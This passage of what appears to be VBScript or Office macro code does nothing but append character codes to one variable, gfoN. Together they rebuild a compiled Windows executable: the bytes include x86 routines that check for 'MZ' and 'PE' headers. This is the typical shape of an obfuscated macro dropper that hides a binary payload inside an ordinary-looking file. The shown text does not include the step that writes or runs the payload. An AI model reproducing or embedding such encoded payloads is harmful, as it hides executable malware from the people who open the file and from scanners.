gfoN=gfoN&Chr(192)&Chr(116)&Chr(49)&Chr(193)&Chr(251)&Chr(2)&Chr(80)&Chr(141)&Chr(52)&Chr(152)&Chr(232)&Chr(111)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(97)&Chr(243)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(131)&Chr(198)&Chr(4)&Chr(86)&Chr(232)&Chr(86)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(89)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(106)&Chr(4)&Chr(106)&Chr(32)&Chr(232)&Chr(67)&Chr(17)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(47)&Chr(243)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(106)&Chr(24)&Chr(88)&Chr(94)
gfoN=gfoN&Chr(195)&Chr(131)&Chr(38)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(200)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(212)&Chr(248)&Chr(255)&Chr(255)&Chr(232)&Chr(183)&Chr(229)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(248)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(240)&Chr(248)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(150)&Chr(229)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(255)&Chr(255)&Chr(255)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(247)&Chr(216)&Chr(89)&Chr(72)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(141)&Chr(183)&Chr(176)
gfoN=gfoN&Chr(163)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(172)&Chr(242)&Chr(255)&Chr(255)&Chr(131)&Chr(199)&Chr(4)&Chr(89)&Chr(137)&Chr(6)&Chr(131)&Chr(255)&Chr(40)&Chr(114)&Chr(232)&Chr(95)&Chr(206)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(1)&Chr(116)&Chr(4)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(65)&Chr(60)&Chr(3)&Chr(193)&Chr(129)&Chr(56)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(51)&Chr(210)&Chr(185)&Chr(11)&Chr(1)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(72)&Chr(24)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)
gfoN=gfoN&Chr(139)&Chr(72)&Chr(60)&Chr(3)&Chr(200)&Chr(15)&Chr(183)&Chr(65)&Chr(20)&Chr(83)&Chr(86)&Chr(15)&Chr(183)&Chr(113)&Chr(6)&Chr(51)&Chr(210)&Chr(87)&Chr(141)&Chr(68)&Chr(8)&Chr(24)&Chr(133)&Chr(246)&Chr(118)&Chr(27)&Chr(139)&Chr(125)&Chr(12)&Chr(139)&Chr(72)&Chr(12)&Chr(59)&Chr(249)&Chr(114)&Chr(9)&Chr(139)&Chr(88)&Chr(8)&Chr(3)&Chr(217)&Chr(59)&Chr(251)&Chr(114)&Chr(10)&Chr(66)&Chr(131)&Chr(192)&Chr(40)&Chr(59)&Chr(214)&Chr(114)&Chr(232)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(254)&Chr(104)&Chr(232)&Chr(147)&Chr(64)&Chr(0)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(131)&Chr(236)&Chr(8)&Chr(83)
gfoN=gfoN&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(248)&Chr(51)&Chr(197)&Chr(80)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(42)&Chr(255)&Chr(255)&Chr(255)&Chr(191)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(85)&Chr(139)&Chr(69)&Chr(8)&Chr(45)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(59)&Chr(139)&Chr(64)&Chr(36)&Chr(193)&Chr(232)&Chr(31)&Chr(247)&Chr(208)&Chr(131)&Chr(224)&Chr(1)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(8)&Chr(139)&Chr(1)&Chr(51)&Chr(210)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(143)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(139)
gfoN=gfoN&Chr(13)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(86)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(15)&Chr(139)&Chr(241)&Chr(107)&Chr(246)&Chr(12)&Chr(3)&Chr(117)&Chr(8)&Chr(131)&Chr(192)&Chr(12)&Chr(59)&Chr(198)&Chr(114)&Chr(236)&Chr(107)&Chr(201)&Chr(12)&Chr(3)&Chr(77)&Chr(8)&Chr(94)&Chr(59)&Chr(193)&Chr(115)&Chr(5)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(2)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(255)&Chr(53)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(104)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(32)&Chr(104)&Chr(8)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(173)&Chr(246)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(125)&Chr(216)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(251)&Chr(11)&Chr(127)&Chr(76)&Chr(116)&Chr(21)&Chr(139)&Chr(195)&Chr(106)&Chr(2)&Chr(89)&Chr(43)&Chr(193)&Chr(116)&Chr(34)&Chr(43)&Chr(193)
gfoN=gfoN&Chr(116)&Chr(8)&Chr(43)&Chr(193)&Chr(116)&Chr(100)&Chr(43)&Chr(193)&Chr(117)&Chr(68)&Chr(232)&Chr(1)&Chr(243)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(117)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(97)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(255)&Chr(119)&Chr(92)&Chr(139)&Chr(211)&Chr(232)&Chr(93)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(198)&Chr(8)&Chr(139)&Chr(6)&Chr(235)&Chr(90)&Chr(139)&Chr(195)&Chr(131)&Chr(232)&Chr(15)&Chr(116)&Chr(60)&Chr(131)&Chr(232)&Chr(6)&Chr(116)&Chr(43)&Chr(64)&Chr(116)&Chr(28)&Chr(232)&Chr(95)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(229)&Chr(251)&Chr(255)
gfoN=gfoN&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(174)&Chr(190)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(22)&Chr(190)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(10)&Chr(190)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(164)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(89)&Chr(51)&Chr(192)&Chr(131)&Chr(125)&Chr(224)&Chr(1)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(224)&Chr(117)&Chr(7)&Chr(106)&Chr(3)&Chr(232)&Chr(221)&Chr(228)&Chr(255)&Chr(255)&Chr(57)&Chr(69)&Chr(228)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(32)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(251)
gfoN=gfoN&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(27)&Chr(139)&Chr(79)&Chr(96)&Chr(137)&Chr(77)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(64)&Chr(139)&Chr(79)&Chr(100)&Chr(137)&Chr(77)&Chr(208)&Chr(199)&Chr(71)&Chr(100)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(46)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(137)&Chr(77)&Chr(220)&Chr(139)&Chr(13)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(21)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(3)&Chr(202)&Chr(57)&Chr(77)&Chr(220)&Chr(125)&Chr(25)&Chr(139)&Chr(77)&Chr(220)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(87)&Chr(92)&Chr(137)&Chr(68)&Chr(17)&Chr(8)&Chr(255)&Chr(69)&Chr(220)&Chr(235)&Chr(219)&Chr(232)&Chr(12)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(199)&Chr(69)
gfoN=gfoN&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(31)&Chr(255)&Chr(119)&Chr(100)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(235)&Chr(25)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(125)&Chr(216)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(174)&Chr(248)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(131)&Chr(251)&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(17)&Chr(139)&Chr(69)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(6)&Chr(139)&Chr(69)&Chr(208)&Chr(137)&Chr(71)&Chr(100)&Chr(51)&Chr(192)&Chr(232)&Chr(79)&Chr(245)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)
gfoN=gfoN&Chr(72)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(84)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(88)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(208)&Chr(244)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(164)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(47)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(224)&Chr(51)&Chr(201)&Chr(61)&Chr(23)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(193)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(129)&Chr(125)&Chr(224)&Chr(23)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(8)&Chr(255)&Chr(21)&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(194)&Chr(244)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(83)&Chr(86)&Chr(87)&Chr(232)&Chr(217)
gfoN=gfoN&Chr(238)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(131)&Chr(61)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(15)&Chr(133)&Chr(142)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(80)&Chr(136)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(160)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(42)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(68)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(20)&Chr(1)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(35)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(52)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(14)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(32)&Chr(136)&Chr(64)&Chr(0)&Chr(87)
gfoN=gfoN&Chr(163)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(249)&Chr(237)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(4)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(228)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(20)&Chr(104)&Chr(236)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(204)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(79)&Chr(57)&Chr(29)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(116)&Chr(71)&Chr(80)&Chr(232)&Chr(42)&Chr(238)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(232)&Chr(29)&Chr(238)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(89)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(246)&Chr(116)&Chr(44)&Chr(133)&Chr(255)&Chr(116)&Chr(40)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(25)&Chr(141)&Chr(77)&Chr(248)&Chr(81)&Chr(106)&Chr(12)&Chr(141)&Chr(77)&Chr(236)&Chr(81)&Chr(106)&Chr(1)&Chr(80)&Chr(255)&Chr(215)&Chr(133)&Chr(192)&Chr(116)&Chr(6)&Chr(246)&Chr(69)&Chr(244)&Chr(1)&Chr(117)&Chr(9)&Chr(129)&Chr(77)&Chr(16)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(235)&Chr(57)&Chr(161)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(48)&Chr(80)&Chr(232)&Chr(218)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(37)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(133)&Chr(192)&Chr(116)&Chr(28)&Chr(161)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(19)&Chr(80)&Chr(232)&Chr(189)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)
gfoN=gfoN&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(255)&Chr(53)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(165)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(16)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(225)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(106)&Chr(248)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(60)&Chr(139)
gfoN=gfoN&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(24)&Chr(235)&Chr(218)&Chr(139)&Chr(208)&Chr(56)&Chr(26)&Chr(116)&Chr(4)&Chr(66)&Chr(79)&Chr(117)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(238)&Chr(138)&Chr(14)&Chr(136)&Chr(10)&Chr(66)&Chr(70)&Chr(58)&Chr(203)&Chr(116)&Chr(3)&Chr(79)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(24)&Chr(232)&Chr(154)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(181)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(51)&Chr(219)&Chr(87)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(16)&Chr(57)&Chr(93)&Chr(12)&Chr(117)&Chr(18)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(59)&Chr(243)
gfoN=gfoN&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(88)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(225)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(213)&Chr(57)&Chr(93)&Chr(20)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(202)&Chr(139)&Chr(85)&Chr(16)&Chr(59)&Chr(211)&Chr(117)&Chr(4)&Chr(136)&Chr(30)&Chr(235)&Chr(209)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(139)&Chr(198)&Chr(117)&Chr(15)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(30)&Chr(79)&Chr(117)&Chr(243)&Chr(235)&Chr(25)&Chr(138)&Chr(10)&Chr(136)&Chr(8)&Chr(64)&Chr(66)&Chr(58)&Chr(203)&Chr(116)&Chr(8)&Chr(79)&Chr(116)&Chr(5)&Chr(255)&Chr(77)&Chr(20)&Chr(117)&Chr(238)&Chr(57)&Chr(93)&Chr(20)
gfoN=gfoN&Chr(117)&Chr(2)&Chr(136)&Chr(24)&Chr(59)&Chr(251)&Chr(117)&Chr(139)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(117)&Chr(15)&Chr(139)&Chr(69)&Chr(12)&Chr(106)&Chr(80)&Chr(136)&Chr(92)&Chr(6)&Chr(255)&Chr(88)&Chr(233)&Chr(120)&Chr(255)&Chr(255)&Chr(255)&Chr(136)&Chr(30)&Chr(232)&Chr(222)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(130)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(36)&Chr(138)&Chr(1)&Chr(131)&Chr(193)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(78)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(1)&Chr(186)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(3)&Chr(208)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(194)&Chr(131)&Chr(193)&Chr(4)&Chr(169)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(232)&Chr(139)&Chr(65)&Chr(252)&Chr(132)&Chr(192)&Chr(116)&Chr(50)&Chr(132)&Chr(228)&Chr(116)&Chr(36)&Chr(169)&Chr(0)&Chr(0)&Chr(255)&Chr(0)&Chr(116)&Chr(19)&Chr(169)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(116)&Chr(2)&Chr(235)&Chr(205)&Chr(141)&Chr(65)&Chr(255)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(254)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(253)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(252)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)
